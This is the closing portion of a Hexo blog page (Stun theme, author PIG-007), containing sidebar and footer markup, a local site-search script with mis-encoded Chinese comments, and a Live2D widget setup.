          æ¡ä»¶äºŒ</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">120</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">65</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">62</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright Â© 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // å°† XML è½¬ä¸º JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // æœç´¢å¯¹è±¡ï¼ˆæ ‡é¢˜ã€å†…å®¹ï¼‰çš„æƒé‡ï¼Œå½±å“æ˜¾ç¤ºé¡ºåº
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // æ ¹æ®ç©ºç™½å­—ç¬¦åˆ†éš”å…³é”®å­—
        var keywords = searchText.split(/[\s]+/);
        // æœç´¢ç»“æœ
        var matchPosts = [];

        // æœ‰å¤šä¸ªå…³é”®å­—æ—¶ï¼Œå°†åŸæ–‡å­—æ•´ä¸ªä¿å­˜ä¸‹æ¥
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // é˜²æ­¢æœªè¾“å…¥å­—ç¬¦æ—¶æœç´¢
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // æ²¡æœ‰æ ‡é¢˜çš„æ–‡ç« ä½¿ç”¨é¢„è®¾çš„ i18n å˜é‡ä»£æ›¿
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // åˆ é™¤ HTML æ ‡ç­¾ å’Œ æ‰€æœ‰ç©ºç™½å­—ç¬¦
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // åˆ é™¤é‡å¤çš„ /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // æ ‡é¢˜ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var titleHitSlice = [];
            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>